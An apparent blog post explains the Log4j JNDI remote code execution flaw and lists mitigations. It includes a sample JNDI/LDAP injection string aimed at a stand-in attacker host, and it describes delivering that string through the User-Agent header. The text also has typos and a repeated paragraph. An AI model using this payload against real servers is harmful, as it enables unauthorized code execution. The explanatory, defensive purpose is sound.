## Massive Log4j Java vulnerability: What it is & how to fix it?

Found on December 11 through an POC,  [Log4J’s vulnerability](https://www.tenable.com/cve/CVE-2021-44228)  is one of the biggest vulnerabilities we have found. This will affect tens of thousands of enterprise websites running on Java. Let’s go through, what happened and how to fix it?

# What is Log4J?
Log4J is an extremely popular open-sources library used in Java to manage application logging. It is an extremely popular library among Java developers because of how simple it makes logging in Java.

**What does zero-day vulnerability mean?**  

This means the developer has “zero days” to fix the bug and this can affect the systems immediately.


![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639764405467/LRegiApoo.png)

# What does this log4j vulnerability do?
This is a Remote Code Execution vulnerability, meaning external malicious code can run on the server with it.

You might think how can a logging library help in remote code execution? Well, the reason why this is happening is a feature, present in Log4J. It enables log4J to actually execute Java code. This is enabled through something called JNDI.

# What is JNDI?
JNDI stands for Java Naming and Directory Interface. It is an API that allows applications to check on services in a resource-independent way. This has several uses — for instance, it enables access to Java resources without exposing the resources or path to them.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639764768134/r0Ad1HBcj.png)

# How JNDI works
Now, in case of log4j, when it sees a JNDI reference in its logs, it will actually go to the resource location and fetch what it needs to resolve the JNDI variable and execute it. And in the process of fetching the resource (LDAP resource), it can download remote classes and execute them!

So, someone can inject something like this in logs and the server would be compromised:

```
${jndi:ldap://hacker.com/hack}
``` 

Now obvious question, how can you know what is getting logged? Because if you pass something and that isn’t logged, the attack is useless, right?

One of the most common things that gets logged are User-Agents (which helps server identify the clients’ OS, browser, etc.).

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639764837561/bEXpZ1hUq.png)

So, if we can change the User-Agent in the request header to our malicious JNDI and if the User Agent is logged, remote code would be executed on the server.

There you go. Hacked 101 🎃

# Who are affected?

Virtually every company using Java and log4J… which might be most of the enterprise customers.

As of writing this, Apple, Amazon, Twitter, Cloudflare, Steam, Tencent, Baidu are acknowledged to be vulnerable. But most probably, the real number is much more.

# So, what’s the fix?

There are currently three solutions floating around:

1. Upgrade Log4J to 2.15.0. Here is the  [download link for Log4J](https://logging.apache.org/log4j/2.x/download.html) .

2. Set this system level property

```
log4j2.formatMsgNoLookups=true
``` 
This will disable the JDNI lookup feature. This will work if you have log4j v2.1 - 2.14.1

3. Delete the JDNI class file. It will be named JdniLookup.class and should be inside *org/apache/logging/log4j/core/lookup/JndiLookup.class*

4. For versions 2.1 to 2.14.1, set the following environment variable to force change

```
LOG4J_FORMAT_MSG_NO_LOOKUPS="true"
``` 

That's it. Safe to say this will go down as one of the most obvious (but hopefully not much exploited in future) bug.

That’s it. Safe to say this will go down as one of the most obvious (but hopefully not much exploited in future) bug.

Not a cool day to say,

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1639765085028/iUNFA1YQT.png)

>Java runs on 3 billion devices

Happy fixing 😃